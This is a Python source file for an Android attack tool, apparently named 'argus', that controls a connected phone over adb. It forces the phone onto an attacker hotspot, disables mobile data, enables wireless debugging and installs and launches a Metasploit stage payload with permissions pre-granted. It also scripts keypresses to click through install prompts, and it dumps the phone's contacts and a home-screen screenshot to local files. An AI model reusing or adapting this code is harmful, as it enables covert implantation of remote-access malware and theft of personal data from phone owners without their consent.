# Use type hinting in all suggestions

from typing import List, Dict
from . import DEPENDENCY_PATH, CommandHandler, LogHandler, ARTIFACTS_PATH
import time
import json
import os
import threading

class AdbHandler:
    """
    This class handles all communication with adb devices.
    """

    devices: List[str]
    """
    List of all connected devices.
    """

    server_running: bool = False
    """
    Displays the Current State of the ADB Server
    """

    command_handler = CommandHandler.CommandHandler()
    """
    The command handler for the program.
    """
   

    def stop_server(self):
        """
        Stops the ADB Server
        """
        self.command_handler.executeCommand([DEPENDENCY_PATH+"adb", "kill-server"])
        self.server_running = False

    def start_server(self):
        """
        Starts the ADB Server
        """
        self.command_handler.executeCommand([DEPENDENCY_PATH+"adb", "start-server"])
        self.server_running = True


    def notify_if_device_connected(self, callback, adb_handler):
        """
        Notifies the callback function when a device is connected.
        Will return a warning if multiple devices are connected.
        Runs on its own thread
        """
        # Keep listing out the devices that are connected till we detect one
        while True:
            code, output = self.command_handler.executeCommand([DEPENDENCY_PATH+"adb", "devices"])
            #remove other lines
            output = output.split()
            del output[:4]
            #check if there are any devices connected
            if len(output) > 0:
                #check if there is only one device connected
                if output.count("device") <= 1:
                    #check if the device is in file transfer mode
                    if output[1] == "no":
                        #notify the callback that we dont have permission and loop till granted
                        callback("Device Connected No Permission", adb_handler)
                        time.sleep(2)
                        continue
                    #notify the callback
                    LogHandler.LogHandler().logMessage("Detected ADB device with id: "+output[0])
                    callback("Device Connected", adb_handler)
                    break
                else:
                    LogHandler.LogHandler().logMessage("Detected Multiple Devices, using only the first one with id "+output[0])
                    callback("Multiple Devices Connected", adb_handler)
                    break
            else:
                callback("No Devices Connected", adb_handler)
            time.sleep(2)

    def send_wifi_payload(self):
        """
        Installs the apk that allows the android device to connect to our hotspot automatically
        """
        code, output = self.command_handler.executeCommand([DEPENDENCY_PATH+"adb", "install", DEPENDENCY_PATH+"adb-join-wifi.apk"])
        
    def connect_to_wifi(self):
        """
        Runs the application that we installed to connect the device to the wifi network
        """
        # first adb commnad we turn on the wifi of thed evice in case it is off
        code, output = self.command_handler.executeCommand([DEPENDENCY_PATH+"adb", "shell", "svc", "wifi", "enable"])
        code, output = self.command_handler.executeCommand([DEPENDENCY_PATH+"adb", "shell", "am", "start", "-n", "com.steinwurf.adbjoinwifi/.MainActivity", "-e", "ssid","argusVnet","-e","password_type","WPA","-e","password","argusVnet"])

    def disable_mobile_data(self):
        """
        Disables the mobile data of the device
        """
        code, output = self.command_handler.executeCommand([DEPENDENCY_PATH+"adb", "shell", "svc", "data", "disable"])

    def go_home(self):
        """
        Sends a home keypress to the android device
        """
        code, output = self.command_handler.executeCommand([DEPENDENCY_PATH+"adb", "shell", "input", "keyevent", "KEYCODE_HOME"])

    def switch_to_wifi_debugging(self, ip):
        """
        Swicthes the device over to wireless debugging
        """
        code, output = self.command_handler.executeCommand([DEPENDENCY_PATH+"adb", "tcpip", "5555"])
        code, output = self.command_handler.executeCommand([DEPENDENCY_PATH+"adb", "connect",ip+":5555"])
        LogHandler.LogHandler().logMessage("Device is now in Wireless Debugging Mode on ip:"+ip+":5555")
        print("You can unplug the device from the PC Now")

    def deploy_exploit(self):
        """
        Deploys the exploit to the device
        """
        # temp = threading.Thread(target = self.accept_install, name= "accept_install")
        # temp.start()
        code, output = self.command_handler.executeCommand([DEPENDENCY_PATH+"adb", "install", "-g", ARTIFACTS_PATH+"payload.apk",])
        # we then start the apk that we just deployed and wait for a few seconds
        LogHandler.LogHandler().logMessage("Deploying exploit onto device and launching")  
        output = os.system(DEPENDENCY_PATH+"adb shell monkey -p com.metasploit.stage 1")
        # # Accept the popup
        # time.sleep(2)
        # #tab
        # self.command_handler.executeCommand([DEPENDENCY_PATH+"adb", "shell", "input", "keyevent", "61"])
        # #enter
        # self.command_handler.executeCommand([DEPENDENCY_PATH+"adb", "shell", "input", "keyevent", "66"])
        #sleep for 5 seconds
        time.sleep(5)

    def accept_install(self):
        """
        Accepts the install of the payload
        """
        time.sleep(1)
        #tab
        code, output = self.command_handler.executeCommand([DEPENDENCY_PATH+"adb", "shell", "input", "keyevent", "61"])
        #enter
        code, output = self.command_handler.executeCommand([DEPENDENCY_PATH+"adb", "shell", "input", "keyevent", "66"])
        time.sleep(.5)
        #tab
        code, output = self.command_handler.executeCommand([DEPENDENCY_PATH+"adb", "shell", "input", "keyevent", "61"])
        #tab
        code, output = self.command_handler.executeCommand([DEPENDENCY_PATH+"adb", "shell", "input", "keyevent", "61"])
        #enter
        code, output = self.command_handler.executeCommand([DEPENDENCY_PATH+"adb", "shell", "input", "keyevent", "66"])



    def get_contacts(self):
        """
        Gets the contacts from the device
        """
        #creates the temporary file that we ne
        code, output = self.command_handler.execute_as_bash([DEPENDENCY_PATH+"adb shell content query --uri content://contacts/phones/  --projection display_name:number:notes >> "+ARTIFACTS_PATH+"contacts.txt"])
        LogHandler.LogHandler().logMessage("Contacts Obtained using adb")
        return output
    
    def get_device_info(self):
        """
        Gets basic device info as soon as possible so that the front end can start displaying.
        The info is stored in .argus/artifacts/device_info.json
        """
        # Get the battery level
        code, battery_level = self.command_handler.executeCommand([DEPENDENCY_PATH+"adb", "shell", "dumpsys", "battery"])
        vnet_status = "Active"
        # Get the android version of the device
        code, output = self.command_handler.executeCommand([DEPENDENCY_PATH+"adb", "shell", "getprop", "ro.build.version.release"])
        android_version = output.strip()
        # Get the device model
        code, output = self.command_handler.executeCommand([DEPENDENCY_PATH+"adb", "shell", "getprop", "ro.product.model"])
        device_model = output.strip()
        # Get the device manufacturer
        code, output = self.command_handler.executeCommand([DEPENDENCY_PATH+"adb", "shell", "getprop", "ro.product.manufacturer"])
        device_manufacturer = output.strip()
        data_sync_status = "Syncing"
        # Get a screenshot of the home screen
        code, output = self.command_handler.execute_as_bash([DEPENDENCY_PATH+"adb exec-out screencap -p >> "+ARTIFACTS_PATH+"homescreen.png"])
        # create the json file and store it
        device_info = {"battery_level":battery_level, "vnet_status":vnet_status, "android_version":android_version, "device_model":device_model, "device_manufacturer":device_manufacturer, "data_sync_status":data_sync_status, "call_log": False, "contacts": False, "sms": False, "Files": False}
        with open(ARTIFACTS_PATH+"device_info.json", "w") as f:
            json.dump(device_info, f)


        




